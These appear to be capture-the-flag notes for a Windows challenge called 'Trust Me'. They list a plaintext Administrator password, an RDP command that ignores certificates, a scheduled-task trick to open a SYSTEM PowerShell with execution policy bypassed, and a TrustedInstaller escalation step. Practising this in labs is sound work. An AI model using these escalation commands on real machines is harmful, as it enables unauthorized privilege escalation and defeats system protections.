# username
.\Administrator
# password for the challenge (Trust Me)
h$4#82PSK0BUBaf7

# this will rdp into a windows machine from kali
xfreerdp3 /v:IP /u:Administrator /p:'password' +clipboard /cert:ignore

# You may have to open a system powershell window:
# path to PowerShell
$ps = "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe"

# schedule a SYSTEM task to start one minute from now
$time = (Get-Date).AddMinutes(1).ToString('HH:mm')
schtasks /Create /TN SysPSShell /SC ONCE /ST $time /TR "$ps -NoLogo -ExecutionPolicy Bypass" /RL HIGHEST /RU SYSTEM /IT /F | Out-Null

# start the task right away
Start-Sleep 2
schtasks /Run /TN SysPSShell

Task Scheduler → Task Scheduler Library → SysPSShell → right-click → “Run.”
whoami
whoami /all | sls SeDebugPrivilege


or
Start-Service TrustedInstaller -ErrorAction SilentlyContinue
cd C:\Users\Administrator\Desktop
.\Run-AsTrustedInstaller.ps1 -Exe "C:\Windows\System32\cmd.exe"
# then from the new TI cmd:
whoami /user   # confirm TrustedInstaller
"C:\Users\Administrator\Desktop\TrustMe.exe"
